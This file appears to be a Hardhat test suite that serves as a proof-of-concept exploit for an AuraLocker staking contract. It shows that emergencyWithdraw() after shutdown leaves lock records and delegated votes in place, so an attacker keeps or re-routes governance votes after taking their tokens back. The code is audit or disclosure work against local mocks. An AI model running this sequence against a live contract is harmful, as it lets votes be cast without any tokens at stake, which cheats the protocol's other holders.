import { expect } from "chai";
import { ethers, network } from "hardhat";
import type { BigNumber } from "ethers";

async function latestTimestampBN(): Promise<BigNumber> {
  const b = await ethers.provider.getBlock("latest");
  return ethers.BigNumber.from(b.timestamp);
}

// epoch = floor(ts / rewardsDuration) * rewardsDuration
function upcomingEpoch(ts: BigNumber, rewardsDuration: BigNumber): BigNumber {
  return ts.add(rewardsDuration).div(rewardsDuration).mul(rewardsDuration);
}

async function setTime(ts: BigNumber) {
  await network.provider.send("evm_setNextBlockTimestamp", [ts.toNumber()]);
  await network.provider.send("evm_mine");
}

/* MVSI bug: emergencyWithdraw() clears balances.locked and returns tokens
but doesn't clear userLocks/reconcile state */

describe("AuraLocker PoC: ghost votes after emergencyWithdraw()", function () {
  it("delegatee retains votes after attacker emergencyWithdraws (shutdown)", async function () {
    const [owner, attacker, delegatee] = await ethers.getSigners();

    // deploy the mock erc20
    const ERC20Mock = await ethers.getContractFactory("ERC20Mock");
    const staking = await ERC20Mock.deploy("STK", "STK", 18);
    await staking.deployed();

    // deploy native cvxCRV
    const cvxCrv = await ERC20Mock.deploy("cvxCRV", "cvxCRV", 18);
    await cvxCrv.deployed();

    // deploy baseline AuraLocker
    const AuraLocker = await ethers.getContractFactory("AuraLocker");
    const locker = await AuraLocker.deploy("AuraLocker", "AURA-L", staking.address, cvxCrv.address, delegatee.address);
    await locker.deployed();
    const amount = ethers.utils.parseEther("100");

    // fund attacker and approve
    await staking.mint(attacker.address, amount);
    await staking.connect(attacker).approve(locker.address, amount);

    // lock, delegate, and shutdown
    await locker.connect(attacker).lock(attacker.address, amount);
    await locker.connect(attacker).delegate(delegatee.address);
    await locker.connect(owner).shutdown();

    // attacker gets tokens, balances.locked = 0, but uncleared userLocks and non-zeroed vote state
    const balBefore = await staking.balanceOf(attacker.address);
    await locker.connect(attacker).emergencyWithdraw();
    const balAfter = await staking.balanceOf(attacker.address);
    expect(balAfter.sub(balBefore)).to.eq(amount);

    // check balances.locked == 0
    const lockedBalances = await locker.lockedBalances(attacker.address);
    const totalLocked: BigNumber = lockedBalances.total ?? lockedBalances[0]; // compatible with/without named outputs
    expect(totalLocked).to.eq(0);

    // prove userLocks still exists
    const firstLock = await locker.userLocks(attacker.address, 0);
    expect(firstLock.unlockTime).to.not.eq(0);

    // votes get recorded for upcoming epoch, so warp to that epoch boundary++
    const rd: BigNumber = await locker.rewardsDuration();
    const t0 = await latestTimestampBN();
    const up = upcomingEpoch(t0, rd);
    await setTime(up.add(1));

    // delegatee still has votes despite attacker having withdrawn tokens
    const votes: BigNumber = await locker.getVotes(delegatee.address);
    expect(votes).to.be.gt(0);
  });

  it("attacker can re-route votes after emergencyWithdraw() because userLocks length stays > 0", async function () {
    const [owner, attacker, delegatee, otherDelegatee] = await ethers.getSigners();

    // mock staking token
    const ERC20Mock = await ethers.getContractFactory("ERC20Mock");
    const staking = await ERC20Mock.deploy("STK", "STK", 18);
    await staking.deployed();

    // mock cvxCRV token
    const cvxCrv = await ERC20Mock.deploy("cvxCRV", "cvxCRV", 18);
    await cvxCrv.deployed();

    // deploy AuraLocker
    const AuraLocker = await ethers.getContractFactory("AuraLocker");
    const locker = await AuraLocker.deploy("AuraLocker", "AURA-L", staking.address, cvxCrv.address, delegatee.address);
    await locker.deployed();

    // mint and approve 100 ether
    const amount = ethers.utils.parseEther("100");
    await staking.mint(attacker.address, amount);
    await staking.connect(attacker).approve(locker.address, amount);

    // connect to attacker and lock, delegate
    await locker.connect(attacker).lock(attacker.address, amount);
    await locker.connect(attacker).delegate(delegatee.address);

    // shutdown and withdraw
    await locker.connect(owner).shutdown();
    await locker.connect(attacker).emergencyWithdraw();

    // this would revert if emergencyWithdraw had cleared userLocks or disabled delegation on shutdown!
    await locker.connect(attacker).delegate(otherDelegatee.address);

    const rd: BigNumber = await locker.rewardsDuration();
    const t0 = await latestTimestampBN();
    const up = upcomingEpoch(t0, rd); await setTime(up.add(1));

    const vOld: BigNumber = await locker.getVotes(delegatee.address);
    const vNew: BigNumber = await locker.getVotes(otherDelegatee.address);
    expect(vNew).to.be.gt(0); expect(vOld.add(vNew)).to.be.gt(0);
  });
});